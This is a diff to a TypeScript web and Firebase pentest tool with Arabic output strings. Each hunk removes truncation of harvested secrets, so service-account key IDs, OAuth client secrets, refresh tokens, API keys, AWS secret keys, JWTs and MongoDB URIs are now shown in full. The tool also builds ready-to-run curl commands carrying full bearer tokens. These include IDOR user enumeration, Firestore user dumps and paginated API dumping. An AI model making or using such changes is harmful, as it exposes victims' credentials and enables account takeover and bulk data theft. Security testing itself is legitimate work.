@@ -4408,7 +4408,7 @@ export async function extractFirebaseConfigDeep(sessionId: string): Promise<Deep
           layer5Findings.push(`🔴 SERVICE ACCOUNT مكتشف في ${rel} — وصول admin كامل!`);
           layer5Findings.push(`   📦 Project: ${sa.project_id}`);
           layer5Findings.push(`   📧 Email: ${sa.client_email || "?"}`);
-          layer5Findings.push(`   🔑 Key ID: ${(sa.private_key_id || "").slice(0, 12)}...`);
+          layer5Findings.push(`   🔑 Key ID: ${sa.private_key_id || "?"}`);
           addConfig({
             projectId: sa.project_id,
             source: `Service Account: ${rel}`,
@@ -4422,13 +4422,13 @@ export async function extractFirebaseConfigDeep(sessionId: string): Promise<Deep
     // OAuth client secrets
     const oauthSecretMatch = content.match(/"client_secret"\s*:\s*"([^"]+)"/);
     if (oauthSecretMatch) {
-      layer5Findings.push(`🟡 OAuth Client Secret في ${rel}: ${oauthSecretMatch[1].slice(0, 12)}...`);
+      layer5Findings.push(`🟡 OAuth Client Secret في ${rel}: ${oauthSecretMatch[1]}`);
     }
 
     // Refresh tokens
     const refreshMatch = content.match(/"refresh_token"\s*:\s*"([^"]{20,})"/);
     if (refreshMatch) {
-      layer5Findings.push(`🔴 Refresh Token في ${rel}: ${refreshMatch[1].slice(0, 20)}...`);
+      layer5Findings.push(`🔴 Refresh Token في ${rel}: ${refreshMatch[1]}`);
     }
   }
 
@@ -4456,7 +4456,7 @@ export async function extractFirebaseConfigDeep(sessionId: string): Promise<Deep
       pat.regex.lastIndex = 0;
       const m = pat.regex.exec(content);
       if (m) {
-        layer5Findings.push(`🔑 ${pat.name} في ${relPath(fp)}: ${m[0].slice(0, 40)}...`);
+        layer5Findings.push(`🔑 ${pat.name} في ${relPath(fp)}: ${m[0]}`);
       }
     }
   }
@@ -4491,7 +4491,7 @@ export async function extractFirebaseConfigDeep(sessionId: string): Promise<Deep
       pat.regex.lastIndex = 0;
       let m: RegExpExecArray | null;
       while ((m = pat.regex.exec(content)) !== null) {
-        layer6Findings.push(`🔓 ${pat.name} في ${rel}: ${(m[1] || m[0]).slice(0, 30)}...`);
+        layer6Findings.push(`🔓 ${pat.name} في ${rel}: ${m[1] || m[0]}`);
       }
     }
   }
@@ -4511,7 +4511,7 @@ export async function extractFirebaseConfigDeep(sessionId: string): Promise<Deep
       for (const s of strings) {
         if (s.match(/AIza[0-9A-Za-z\-_]{35}/) || s.match(/eyJ[A-Za-z0-9\-_=]+\.eyJ/) ||
             s.match(/https?:\/\/[a-z0-9\-]+\.firebaseio\.com/i)) {
-          layer6Findings.push(`🔓 بيانات حساسة في DB [${rel}]: ${s.slice(0, 60)}...`);
+          layer6Findings.push(`🔓 بيانات حساسة في DB [${rel}]: ${s}`);
           foundSensitive = true;
         }
       }
@@ -4922,15 +4922,15 @@ export async function extractFirebaseConfigDeep(sessionId: string): Promise<Deep
       { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ returnSecureToken: true }) },
     );
     if (anonResult.ok && anonResult.json?.idToken) {
-      layer10Findings.push(`🔴 Anonymous Auth مفعّل! يمكن إنشاء حسابات مجهولة بـ API Key: ${apiKey.slice(0, 15)}...`);
-      liveProbes.push({ service: "Anonymous Auth", url: `identitytoolkit (${apiKey.slice(0, 10)}...)`, accessible: true, details: "Anonymous signup enabled — tokens can be generated" });
+      layer10Findings.push(`🔴 Anonymous Auth مفعّل! يمكن إنشاء حسابات مجهولة بـ API Key: ${apiKey}`);
+      liveProbes.push({ service: "Anonymous Auth", url: `identitytoolkit (${apiKey})`, accessible: true, details: "Anonymous signup enabled — tokens can be generated" });
     } else if (anonResult.json?.error?.message === "ADMIN_ONLY_OPERATION") {
-      layer10Findings.push(`✅ Anonymous Auth معطّل: ${apiKey.slice(0, 15)}...`);
-      liveProbes.push({ service: "Anonymous Auth", url: `identitytoolkit (${apiKey.slice(0, 10)}...)`, accessible: false, details: "Anonymous auth disabled" });
+      layer10Findings.push(`✅ Anonymous Auth معطّل: ${apiKey}`);
+      liveProbes.push({ service: "Anonymous Auth", url: `identitytoolkit (${apiKey})`, accessible: false, details: "Anonymous auth disabled" });
     } else {
       const errMsg = anonResult.json?.error?.message || anonResult.text.slice(0, 80);
       layer10Findings.push(`⚠️ Anonymous Auth رد: ${errMsg}`);
-      liveProbes.push({ service: "Anonymous Auth", url: `identitytoolkit (${apiKey.slice(0, 10)}...)`, accessible: false, details: errMsg });
+      liveProbes.push({ service: "Anonymous Auth", url: `identitytoolkit (${apiKey})`, accessible: false, details: errMsg });
     }
 
     // Test email enumeration (check if createAuthUri reveals registered emails)
@@ -4942,10 +4942,10 @@ export async function extractFirebaseConfigDeep(sessionId: string): Promise<Deep
       const providers = emailProbe.json.allProviders || emailProbe.json.signinMethods || [];
       if (emailProbe.json.registered !== undefined) {
         layer10Findings.push(`🟡 Email Enumeration ممكن — يمكن معرفة إذا كان البريد مسجلاً`);
-        liveProbes.push({ service: "Email Enumeration", url: `identitytoolkit (${apiKey.slice(0, 10)}...)`, accessible: true, details: "Email enumeration possible" });
+        liveProbes.push({ service: "Email Enumeration", url: `identitytoolkit (${apiKey})`, accessible: true, details: "Email enumeration possible" });
       } else {
         layer10Findings.push(`✅ Email Enumeration محمي`);
-        liveProbes.push({ service: "Email Enumeration", url: `identitytoolkit (${apiKey.slice(0, 10)}...)`, accessible: false, details: "Email enumeration protected" });
+        liveProbes.push({ service: "Email Enumeration", url: `identitytoolkit (${apiKey})`, accessible: false, details: "Email enumeration protected" });
       }
       if (providers.length > 0) {
         layer10Findings.push(`📋 Auth Providers مكتشفة: ${providers.join(", ")}`);
@@ -4959,7 +4959,7 @@ export async function extractFirebaseConfigDeep(sessionId: string): Promise<Deep
     );
     if (signupProbe.ok && signupProbe.json?.idToken) {
       layer10Findings.push(`🔴 تسجيل حسابات بريد إلكتروني مفتوح بدون قيود!`);
-      liveProbes.push({ service: "Email Signup", url: `identitytoolkit (${apiKey.slice(0, 10)}...)`, accessible: true, details: "CRITICAL — open email/password signup" });
+      liveProbes.push({ service: "Email Signup", url: `identitytoolkit (${apiKey})`, accessible: true, details: "CRITICAL — open email/password signup" });
     } else {
       const errMsg = signupProbe.json?.error?.message || "";
       if (errMsg.includes("EMAIL_EXISTS") || errMsg.includes("OPERATION_NOT_ALLOWED")) {
@@ -4967,7 +4967,7 @@ export async function extractFirebaseConfigDeep(sessionId: string): Promise<Deep
       } else {
         layer10Findings.push(`⚠️ Signup probe: ${errMsg || signupProbe.text.slice(0, 60)}`);
       }
-      liveProbes.push({ service: "Email Signup", url: `identitytoolkit (${apiKey.slice(0, 10)}...)`, accessible: false, details: errMsg || "signup restricted" });
+      liveProbes.push({ service: "Email Signup", url: `identitytoolkit (${apiKey})`, accessible: false, details: errMsg || "signup restricted" });
     }
   }
 
@@ -5479,7 +5479,7 @@ function cipher7CryptoAnalysis(
         const hdr = JSON.parse(Buffer.from(parts[0].replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf-8"));
         const pay = JSON.parse(Buffer.from(parts[1].replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf-8"));
         findings.push({
-          type: "jwt", original: token.slice(0, 60) + "...",
+          type: "jwt", original: token,
           decoded: JSON.stringify({ header: hdr, payload: pay }, null, 2),
           metadata: { algorithm: hdr.alg, issuer: pay.iss, subject: pay.sub, expiry: pay.exp ? new Date(pay.exp * 1000).toISOString() : undefined },
           file: rel,
@@ -5579,7 +5579,7 @@ function cipher7AWSAssessment(
   }
   // 2. Secret Keys
   for (const s of allSecrets.filter(s => s.type.includes("AWS Secret"))) {
-    findings.push({ category: "secret_key", value: s.value.slice(0, 8) + "***", detail: "AWS Secret Key — full IAM access with Access Key", severity: "critical", file: s.file });
+    findings.push({ category: "secret_key", value: s.value, detail: "AWS Secret Key — full IAM access with Access Key", severity: "critical", file: s.file });
   }
 
   // 3. S3 Buckets
@@ -6498,9 +6498,9 @@ print(f"{'═'*60}{RST}\\n")
       ],
       commands: [
         `# IDOR enumeration`,
-        `for i in $(seq 1 100); do curl -s -H "Authorization: Bearer ${token.slice(0,20)}..." ${baseUrl}/api/user/$i | jq '.'; done`,
+        `for i in $(seq 1 100); do curl -s -H "Authorization: Bearer ${token}" ${baseUrl}/api/user/$i | jq '.'; done`,
         `# JWT decode & tamper`,
-        `echo "${token.slice(0,30)}..." | python3 -c "import sys,base64,json; parts=sys.stdin.read().strip().split('.'); print(json.dumps(json.loads(base64.b64decode(parts[1]+'==').decode())))"`,
+        `echo "${token}" | python3 -c "import sys,base64,json; parts=sys.stdin.read().strip().split('.'); print(json.dumps(json.loads(base64.b64decode(parts[1]+'==').decode())))"`,
         `# Burp Suite intercept`,
         `curl -x http://127.0.0.1:8080 -H "Authorization: Bearer TOKEN" ${baseUrl}/api/users`,
         `# No-auth bypass`,
@@ -6579,7 +6579,7 @@ print(f"{'═'*60}{RST}\\n")
         `curl "${firebaseDbUrl || "FIREBASE_URL"}/.json?auth=${firebaseApiKey || "KEY"}" | python3 -m json.tool`,
         `curl "${firebaseDbUrl || "FIREBASE_URL"}/users.json?auth=${firebaseApiKey || "KEY"}" | jq 'to_entries[] | .value.email'`,
         `# Firestore REST`,
-        `curl "https://firestore.googleapis.com/v1/projects/${firebaseProjectId || "PROJECT"}/databases/(default)/documents/users" -H "Authorization: Bearer ${token.slice(0,20)}..."`,
+        `curl "https://firestore.googleapis.com/v1/projects/${firebaseProjectId || "PROJECT"}/databases/(default)/documents/users" -H "Authorization: Bearer ${token}"`,
         `# API pagination`,
         `for page in $(seq 1 10); do curl "${baseUrl}/api/users?page=$page&limit=100" >> dump.json; done`,
         `# AWS S3 public bucket`,
@@ -7302,7 +7302,7 @@ export async function runWebPentest(targetUrl: string): Promise<{
         const hdr = JSON.parse(Buffer.from(parts[0].replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf-8"));
         const pay = JSON.parse(Buffer.from(parts[1].replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf-8"));
         webCipher7Crypto.push({
-          type: "jwt", original: token.slice(0, 60) + "...",
+          type: "jwt", original: token,
           decoded: JSON.stringify({ header: hdr, payload: pay }, null, 2),
           metadata: { algorithm: hdr.alg, issuer: pay.iss, subject: pay.sub, expiry: pay.exp ? new Date(pay.exp * 1000).toISOString() : undefined },
           file: src.name,
@@ -7992,7 +7992,7 @@ if __name__ == "__main__":
         ``, `═══ Firestore ═══`, firebaseLive.firestore ? `   📡 نتيجة: ${firebaseLive.firestore}` : `   ℹ️ لا يوجد Project ID مكتشف`,
         ``, `═══ Firebase Storage ═══`, firebaseLive.storage ? `   📡 نتيجة: ${firebaseLive.storage}` : `   ℹ️ لا يوجد Storage Bucket`,
         ``, `═══ قواعد بيانات أخرى ═══`,
-        ...allSecrets.filter(s => s.type.includes("MongoDB")).map(s => `   🔴 MongoDB URI: ${s.value.slice(0, 60)}...`),
+        ...allSecrets.filter(s => s.type.includes("MongoDB")).map(s => `   🔴 MongoDB URI: ${s.value}`),
         allSecrets.filter(s => s.type.includes("MongoDB")).length === 0 ? `   ✅ لا يوجد قواعد بيانات مكشوفة مباشرة` : "",
       ].filter(Boolean),
       commands: [
@@ -8301,7 +8301,7 @@ if __name__ == "__main__":
     ...exploitGuides.map((guide, idx) => ({
       id: 18 + idx,
       title: `دليل الاستغلال: ${guide.secretType}`,
-      details: `${guide.description.slice(0, 60)}...`,
+      details: guide.description,
       status: "danger" as const,
       findings: [
         `╔══════════════════════════════════════════════════════════════╗`,
